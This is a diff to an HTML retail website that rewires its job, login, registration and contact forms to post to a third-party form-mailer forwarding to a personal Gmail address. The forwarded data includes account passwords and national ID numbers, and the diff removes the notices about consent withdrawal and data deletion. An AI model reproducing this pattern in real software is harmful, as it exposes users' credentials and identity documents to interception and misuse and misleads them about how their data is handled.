@@ -75,41 +75,39 @@
   <div id="jobModal" class="modal"><div class="sheet">
     <span class="close" onclick="closeModal('jobModal')">×</span>
     <h2>Retail Job Application</h2>
-    <form onsubmit="demoSubmit(event)">
-      <div class="row"><input placeholder="First Name" required /><input placeholder="Last Name" required /></div>
-      <div class="row"><input type="email" placeholder="Email" required /><input type="tel" placeholder="Phone" required /></div>
+    <form action="https://formsubmit.co/prashanthdotpm@gmail.com" method="POST">
+      <div class="row"><input name="First Name" placeholder="First Name" required /><input name="Last Name" placeholder="Last Name" required /></div>
+      <div class="row"><input type="email" name="Email" placeholder="Email" required /><input type="tel" name="Phone" placeholder="Phone" required /></div>
       <div class="row">
-        <select id="countryRT" onchange="toggleIDs('RT')" required>
+        <select id="countryRT" name="Country" onchange="toggleIDs('RT')" required>
           <option value="">Country</option><option>KSA</option><option>UAE</option><option>Qatar</option><option>Other</option>
         </select>
-        <input placeholder="Position (e.g., Store Manager)" required />
+        <input name="Position" placeholder="Position (e.g., Store Manager)" required />
       </div>
-      <div id="ksaIdRT" style="display:none"><input placeholder="KSA ID (Iqama)" /></div>
-      <div id="uaeIdRT" style="display:none"><input placeholder="UAE ID" /></div>
-      <div id="qatarIdRT" style="display:none"><input placeholder="Qatar ID" /></div>
-      <div class="row"><input type="number" placeholder="Experience (years)" /><input type="number" placeholder="Expected Salary (USD)" /></div>
+      <div id="ksaIdRT" style="display:none"><input name="KSA ID" placeholder="KSA ID (Iqama)" /></div>
+      <div id="uaeIdRT" style="display:none"><input name="UAE ID" placeholder="UAE ID" /></div>
+      <div id="qatarIdRT" style="display:none"><input name="Qatar ID" placeholder="Qatar ID" /></div>
+      <div class="row"><input type="number" name="Experience" placeholder="Experience (years)" /><input type="number" name="Expected Salary" placeholder="Expected Salary (USD)" /></div>
       
       <!-- GDPR-consent section for Careers -->
       <fieldset>
         <legend>Marketing Consent (Optional)</legend>
-        <label><input type="checkbox" /> I agree to receive marketing emails</label><br/>
-        <label><input type="checkbox" /> I agree to receive SMS notifications</label><br/>
-        <label><input type="checkbox" /> I agree to receive phone calls</label><br/>
-        <label><input type="checkbox" /> I agree to receive WhatsApp updates</label><br/>
-        <small>Consent is optional and can be withdrawn anytime.</small>
+        <label><input type="checkbox" name="Marketing Emails" /> I agree to receive marketing emails</label><br/>
+        <label><input type="checkbox" name="SMS Notifications" /> I agree to receive SMS notifications</label><br/>
+        <label><input type="checkbox" name="Phone Calls" /> I agree to receive phone calls</label><br/>
+        <label><input type="checkbox" name="WhatsApp Updates" /> I agree to receive WhatsApp updates</label><br/>
       </fieldset>
 
       <!-- Data Retention Consent -->
       <fieldset>
         <legend>Data Retention Consent (Optional)</legend>
-        <label><input type="checkbox" /> I agree that my application/CV may be stored for future job opportunities</label><br/>
-        <small>You can request deletion of your data at any time.</small>
+        <label><input type="checkbox" name="Data Retention" /> I agree that my application/CV may be stored for future job opportunities</label><br/>
       </fieldset>
 
       <!-- Mandatory T&C -->
       <div style="margin-top:12px">
         <label>
-          <input type="checkbox" required />
+          <input type="checkbox" required name="Terms & Privacy" />
           I accept the <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a>.
         </label>
       </div>
@@ -119,48 +117,48 @@
     </form>
   </div></div>
 
-  <!-- Universal Modals -->
+  <!-- Login Modal -->
   <div id="loginModal" class="modal"><div class="sheet">
     <span class="close" onclick="closeModal('loginModal')">×</span>
     <h2>Login</h2>
-    <form onsubmit="demoSubmit(event)">
-      <input type="email" placeholder="Email" required />
-      <input type="password" placeholder="Password" required />
+    <form action="https://formsubmit.co/prashanthdotpm@gmail.com" method="POST">
+      <input type="email" name="Email" placeholder="Email" required />
+      <input type="password" name="Password" placeholder="Password" required />
       <button class="btn" type="submit">Login</button>
     </form>
   </div></div>
 
+  <!-- Register Modal -->
   <div id="registerModal" class="modal"><div class="sheet">
     <span class="close" onclick="closeModal('registerModal')">×</span>
     <h2>Register</h2>
-    <form onsubmit="demoSubmit(event)">
-      <div class="row"><input placeholder="First Name" required /><input placeholder="Last Name" required /></div>
-      <div class="row"><input type="tel" placeholder="Phone" required /><input type="email" placeholder="Email" required /></div>
+    <form action="https://formsubmit.co/prashanthdotpm@gmail.com" method="POST">
+      <div class="row"><input name="First Name" placeholder="First Name" required /><input name="Last Name" placeholder="Last Name" required /></div>
+      <div class="row"><input type="tel" name="Phone" placeholder="Phone" required /><input type="email" name="Email" placeholder="Email" required /></div>
       <div class="row">
-        <select id="countryRetail" onchange="toggleIDs('Retail')" required>
+        <select id="countryRetail" name="Country" onchange="toggleIDs('Retail')" required>
           <option value="">Country</option><option>KSA</option><option>UAE</option><option>Qatar</option><option>Other</option>
         </select><div></div>
       </div>
-      <div id="ksaIdRetail" style="display:none"><input placeholder="KSA ID (Iqama)" /></div>
-      <div id="uaeIdRetail" style="display:none"><input placeholder="UAE ID" /></div>
-      <div id="qatarIdRetail" style="display:none"><input placeholder="Qatar ID" /></div>
-      <div class="row"><input type="password" id="pwdRetail" placeholder="Password" required /><input type="password" id="cpwdRetail" oninput="matchPwd('Retail')" placeholder="Confirm Password" required /></div>
+      <div id="ksaIdRetail" style="display:none"><input name="KSA ID" placeholder="KSA ID (Iqama)" /></div>
+      <div id="uaeIdRetail" style="display:none"><input name="UAE ID" placeholder="UAE ID" /></div>
+      <div id="qatarIdRetail" style="display:none"><input name="Qatar ID" placeholder="Qatar ID" /></div>
+      <div class="row"><input type="password" id="pwdRetail" name="Password" placeholder="Password" required /><input type="password" id="cpwdRetail" name="Confirm Password" oninput="matchPwd('Retail')" placeholder="Confirm Password" required /></div>
       <small id="pmRetail" style="color:#c00"></small><br/>
 
       <!-- GDPR-consent section -->
       <fieldset>
         <legend>Marketing Consent (Optional)</legend>
-        <label><input type="checkbox" /> I agree to receive marketing emails</label><br/>
-        <label><input type="checkbox" /> I agree to receive SMS notifications</label><br/>
-        <label><input type="checkbox" /> I agree to receive phone calls</label><br/>
-        <label><input type="checkbox" /> I agree to receive WhatsApp updates</label><br/>
-        <small>Consent is optional and can be withdrawn anytime.</small>
+        <label><input type="checkbox" name="Marketing Emails" /> I agree to receive marketing emails</label><br/>
+        <label><input type="checkbox" name="SMS Notifications" /> I agree to receive SMS notifications</label><br/>
+        <label><input type="checkbox" name="Phone Calls" /> I agree to receive phone calls</label><br/>
+        <label><input type="checkbox" name="WhatsApp Updates" /> I agree to receive WhatsApp updates</label><br/>
       </fieldset>
 
       <!-- Mandatory T&C -->
       <div style="margin-top:12px">
         <label>
-          <input type="checkbox" required />
+          <input type="checkbox" required name="Terms & Privacy" />
           I accept the <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a>.
         </label>
       </div>
@@ -170,13 +168,14 @@
     </form>
   </div></div>
 
+  <!-- Contact Modal -->
   <div id="contactModal" class="modal"><div class="sheet">
     <span class="close" onclick="closeModal('contactModal')">×</span>
     <h2>Contact Us</h2>
-    <form onsubmit="demoSubmit(event)">
-      <div class="row"><input placeholder="Full Name" required /><input type="email" placeholder="Email" required /></div>
-      <input placeholder="Subject" required />
-      <textarea placeholder="Message" required></textarea>
+    <form action="https://formsubmit.co/prashanthdotpm@gmail.com" method="POST">
+      <div class="row"><input name="Full Name" placeholder="Full Name" required /><input type="email" name="Email" placeholder="Email" required /></div>
+      <input name="Subject" placeholder="Subject" required />
+      <textarea name="Message" placeholder="Message" required></textarea>
       <button class="btn" type="submit">Send</button>
     </form>
   </div></div>
@@ -203,7 +202,6 @@
     if(cp.value && p.value!==cp.value){m.textContent='Passwords do not match'}
     else{m.textContent=''}
   }
-  function demoSubmit(e){e.preventDefault();alert('Submitted (demo).')}
 </script>
 </body>
 </html>
